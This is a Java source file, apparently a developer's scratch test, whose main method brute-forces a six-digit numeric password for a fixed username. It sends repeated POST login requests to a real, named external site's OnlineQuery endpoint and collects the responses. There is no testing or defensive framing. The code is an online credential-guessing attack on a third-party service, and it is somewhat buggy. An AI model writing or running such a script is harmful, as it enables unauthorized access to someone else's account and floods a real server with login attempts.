package com.webShopBack.utils;/**
 * @Auther: bee
 * @Date: 2018/11/12 16:59
 * @Description:
 */


import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.HttpClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;


/**
 *@ClassName test
 *@Description TODO
 *@Author zhou
 *Date 2018/11/12 16:59
 *@Version 1.0
 **/
public class test {

    public static void main(String[] args)   {
        String url = "http://www.blscm.cn/OnlineQuery";
        String uname = "079395";
        String[] number = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};
        HashMap<String,Object> map = new HashMap<>();
        String password = "";
        map.put("uname",uname);
        map.put("password","123456");
        String charset = "UTF-8";
        boolean pretty = true;
        StringBuffer reponse = new StringBuffer();
        HttpClient client = new HttpClient();
        PostMethod method = new PostMethod(url);


        try{
        for (int a = 0; a < number.length; a++) {
            for (int b = 0; b < number.length; b++) {
                for (int c = 0; c < number.length; c++) {
                    for (int d = 0; d < number.length; d++) {
                        for (int e = 0; e < number.length; e++) {
                            for (int f = 0; f < number.length; f++) {
                                password = number[a] + number[b] + number[c] + number[d] + number[e]
                                        + number[f];
                                map.put("password",password);
                                if(password.equals("999999")){
                                 return;
                                }
                                if(map != null){
                                    for(Map.Entry<String,Object> entry : map.entrySet()){
                                        method.setParameter(entry.getKey(),
                                                String.valueOf(entry.getValue()));
                                    }
                                }

                                    client.executeMethod(method);
                                    int code = method.getStatusCode();
                                    if(method.getStatusCode() == HttpStatus.SC_OK){
                                        BufferedReader reader = new BufferedReader(new InputStreamReader(
                                                method.getResponseBodyAsStream(),charset
                                        ));
                                        String line;
                                        while((line = reader.readLine())!=null){
                                            if(pretty){
                                                reponse.append(line).append(
                                                        System.getProperty("line.separator"));

                                            }else {
                                                reponse.append(line);
                                            }
                                            reader.close();
                                        }
                                    }

                            }
                        }
                    }
                }
            }
        }  } catch (Exception e1) {
            e1.printStackTrace();
        }
        System.out.println("----------"+reponse.toString());

    }
}
